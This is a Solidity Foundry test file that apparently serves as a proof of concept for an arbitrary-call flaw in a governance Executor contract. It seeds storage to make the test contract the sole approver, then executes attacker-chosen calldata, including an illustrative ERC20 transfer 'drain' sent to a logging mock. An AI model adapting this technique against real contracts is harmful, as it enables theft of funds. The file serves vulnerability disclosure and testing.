// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

import "forge-std/Test.sol";
import { PoCReceiver } from "../src/mocks/PoCReceiver.sol";
import { MaliciousReceiver } from "../src/mocks/MaliciousReceiver.sol";

// Interface for the vulnerable 0.4.x contract
interface IExecutor {
    function propose(address _target, bytes calldata _data) external returns (bytes32);
    function approve(bytes32 _proposalID) external;
    function execute(bytes32 _proposalID) external;
}

contract Executor_ArbitraryCall_PoC is Test {
    IExecutor private executor;
    address private execAddr;
    address private attacker;

    function setUp() public {
        attacker = address(this);

        // IMPORTANT: The artifact key must be <basename>.sol:<ContractName>
        // Match your actual filename and contract name:
        execAddr = deployCode("Executor.sol:Executor");
        executor = IExecutor(execAddr);

        emit log_string("[Setup] Deployed vulnerable Executor:");
        emit log_address(execAddr);

        // ---- Seed minimal governance state ----
        // slot 1 -> uint8 approverCount = 1
        vm.store(execAddr, bytes32(uint256(1)), bytes32(uint256(1)));

        // slot 0 -> mapping(address => approver) approvers
        // mapping slot = 0; key = attacker
        bytes32 slotIdxApprovers = bytes32(uint256(0));
        bytes32 key = bytes32(uint256(uint160(attacker)));
        bytes32 base = keccak256(abi.encode(key, slotIdxApprovers));

        // struct approver { bytes32 identity; bool inPower; }
        vm.store(execAddr, base, bytes32(uint256(1)));                        // identity != 0
        vm.store(execAddr, bytes32(uint256(base) + 1), bytes32(uint256(1))); // inPower = true

        emit log_string("[Setup] Registered attacker as approver; quorum = 1");
    }

    /// @notice Benign demonstration: calls a harmless function on PoCReceiver
    function test_ArbitraryExternalCall_Benign() public {
        PoCReceiver receiver = new PoCReceiver();
        bytes memory data = abi.encodeWithSignature("markCalled()");

        emit log_string("\n[Benign] Target = PoCReceiver.markCalled()");
        emit log_address(address(receiver));
        emit log_bytes(data);

        bytes32 pid = executor.propose(address(receiver), data);
        emit log_string("[Benign] Proposal created"); emit log_bytes32(pid);

        executor.approve(pid);
        emit log_string("[Benign] Proposal approved");

        executor.execute(pid);
        emit log_string("[Benign] Proposal executed");

        assertTrue(receiver.called(), "PoCReceiver.markCalled() should have executed");
        emit log_string("receiver.called == true");
    }

    /// @notice Malicious-looking example: simulate calldata that resembles a token drain,
    /// but route it to MaliciousReceiver which only logs (no funds moved).
    function test_ArbitraryExternalCall_MaliciousExample() public {
        MaliciousReceiver mal = new MaliciousReceiver();

        address fakeToken = address(0xDEAD);
        address victim    = address(0xBEEF);
        uint256 amount    = 1 ether;

        // Example of what an attacker *might* craft (purely illustrative)
        bytes memory tokenTransferCalldata =
            abi.encodeWithSignature("transfer(address,uint256)", victim, amount);

        emit log_string("\n[Malicious Example] Example ERC20 transfer(...) calldata (illustrative):");
        emit log_bytes(tokenTransferCalldata);

        // Our actual executed calldata calls a harmless logger:
        bytes memory simulatedDrainData = abi.encodeWithSignature(
            "simulateTokenDrain(address,address,uint256)",
            fakeToken,
            victim,
            amount
        );

        emit log_string("[Malicious Example] Using attacker-chosen target & calldata:");
        emit log_address(address(mal));
        emit log_bytes(simulatedDrainData);

        bytes32 pid = executor.propose(address(mal), simulatedDrainData);
        emit log_string("[Malicious Example] Proposal created"); emit log_bytes32(pid);

        executor.approve(pid);
        emit log_string("[Malicious Example] Proposal approved");

        executor.execute(pid);
        emit log_string("[Malicious Example] Proposal executed");

        // Assert the call happened with expected params
        assertEq(mal.lastToken(),  fakeToken, "lastToken mismatch");
        assertEq(mal.lastTo(),     victim,    "lastTo mismatch");
        assertEq(mal.lastAmount(), amount,    "lastAmount mismatch");

        emit log_string("Simulated drain recorded (no funds moved).");
        emit log_string("This illustrates how arbitrary calldata could target a real token/privileged contract.");
    }
}
